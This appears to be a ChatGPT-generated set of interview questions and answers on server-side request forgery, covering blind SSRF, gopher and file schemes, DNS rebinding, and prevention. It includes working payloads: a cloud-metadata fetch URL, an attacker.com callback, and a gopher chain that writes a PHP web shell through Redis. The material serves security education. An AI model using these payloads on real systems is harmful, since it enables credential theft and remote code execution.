🌐 Basic & Blind SSRF

🧪 SSRF via URL Schemes (file://, gopher://)

🧠 SSRF with DNS Rebinding

💥 SSRF leading to Remote Code Execution (RCE)


ChatGPT said:
Here are interview questions and answers on Server-Side Request Forgery (SSRF) and its related attack variants, including:

🌐 Basic & Blind SSRF

🧪 SSRF via URL Schemes (file://, gopher://)

🧠 SSRF with DNS Rebinding

💥 SSRF leading to Remote Code Execution (RCE)

These attacks are critical in cloud environments, internal service abuse, metadata access (AWS EC2), and lateral movement.

🌐 1. Basic SSRF
❓Q1. What is SSRF (Server-Side Request Forgery)?
A: SSRF is a vulnerability that allows an attacker to make the server send HTTP or other requests to internal or external systems that the attacker cannot access directly.

❓Q2. When does SSRF happen?
A: When an application:

Takes a user-supplied URL or IP

Fetches content or data from it (e.g., curl, file_get_contents)

Without properly validating or filtering it

❓Q3. Real-life SSRF example?
Request:

http
Copy
Edit
GET /fetch?url=http://169.254.169.254/latest/meta-data/
➡ Returns AWS EC2 metadata (e.g., IAM tokens), which are not accessible from the internet.

❓Q4. What are the risks of SSRF?
A:

Access to internal services (e.g., Redis, MongoDB, localhost-only apps)

Cloud metadata exposure (AWS, GCP, Azure)

Port scanning internal network

Exploiting other services (e.g., via gopher://)

🔍 2. Blind SSRF
❓Q5. What is Blind SSRF?
A: In Blind SSRF, the server makes the request, but the response is not reflected back to the attacker.

❓Q6. How do attackers detect Blind SSRF?
A:

Use external monitoring tools like:

Burp Collaborator

RequestBin

dnslog.cn

Inject URLs like:

perl
Copy
Edit
http://attacker.com/log?hit=ssrf
➡ If a hit is recorded, SSRF is confirmed.

❓Q7. How to prevent Blind SSRF?
A:

Whitelist internal services only if required

Deny access to internal IP ranges:

Copy
Edit
127.0.0.1, 169.254.169.254, 192.168.0.0/16, etc.
Disable unnecessary fetch functionality

🧪 3. SSRF via URL Schemes
❓Q8. How can SSRF abuse special URL schemes?
A: Attackers can use:

file:// to read local files

gopher:// to send arbitrary payloads (used in Redis/SMTP)

dict://, ftp://, http://localhost, etc.

❓Q9. What is the gopher:// SSRF trick?
A:

It enables the attacker to send raw TCP payloads to internal services (like Redis, Memcached), possibly leading to command injection.

Example:
Using SSRF to connect to Redis:

perl
Copy
Edit
gopher://127.0.0.1:6379/_*%0D%0ASET key value%0D%0A
❓Q10. How to prevent SSRF via schemes?
A:

Block dangerous schemes: gopher, file, dict, ftp

Sanitize and validate URL scheme and hostname

Use allowlists (only allow http, https to known domains)

🧠 4. SSRF with DNS Rebinding
❓Q11. What is SSRF via DNS Rebinding?
A: It’s when an attacker tricks the server into resolving a hostname that initially points to a public IP, but rebinds to an internal IP (127.0.0.1, etc.) on the second request.

❓Q12. How does DNS rebinding help SSRF?
A:

Bypasses SSRF protections that filter based on resolved IP

Example domain: attacker-domain.com resolves to:

Request 1: 8.8.8.8 (allowed)

Request 2: 127.0.0.1 (blocked target)

❓Q13. How to prevent SSRF via DNS Rebinding?
A:

Resolve hostname and validate IP before making request

Reject IPs in private/reserved ranges

Implement DNS pinning (resolve once and cache it)

💥 5. SSRF Leading to Remote Code Execution (RCE)
❓Q14. How can SSRF lead to RCE?
A:

If the SSRF can send raw payloads to services like:

Redis (gopher:// attack to write cron jobs)

Elasticsearch or Webhooks with template injections

GCP/AWS metadata → steal access tokens → privilege escalation → RCE

❓Q15. Example of SSRF to RCE via Redis?
A:

SSRF used to send commands like:

php-template
Copy
Edit
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html%0A
gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php%0A
gopher://127.0.0.1:6379/_SET x "<?php system($_GET['cmd']); ?>"%0A
gopher://127.0.0.1:6379/_SAVE
Now you can access /shell.php?cmd=id

❓Q16. How to prevent SSRF → RCE chains?
A:

Disable access to dangerous services (e.g., Redis, metadata APIs)

Use network segmentation

Block dangerous schemes and IP ranges

Use AppArmor or seccomp to isolate backend services



| Type of SSRF       | Description                                 | Attack Vector Example                   | Prevention                                      |
| ------------------ | ------------------------------------------- | --------------------------------------- | ----------------------------------------------- |
| Basic SSRF         | Server fetches internal/external URLs       | `?url=http://localhost/admin`           | Validate URLs, restrict internal access         |
| Blind SSRF         | No visible response, detected via callbacks | `http://burp-collab.net/ping`           | Use allowlists, monitor DNS/HTTP callbacks      |
| URL Scheme SSRF    | Exploits `file://`, `gopher://`, etc.       | `gopher://127.0.0.1:6379/_SET key val`  | Block dangerous schemes                         |
| DNS Rebinding SSRF | DNS resolves to internal IP on 2nd request  | `evil.com → 8.8.8.8 → 127.0.0.1`        | IP verification after resolution                |
| SSRF → RCE         | Sends payloads to internal services         | Write shell via Redis using `gopher://` | Network isolation, no unauth access to backends |


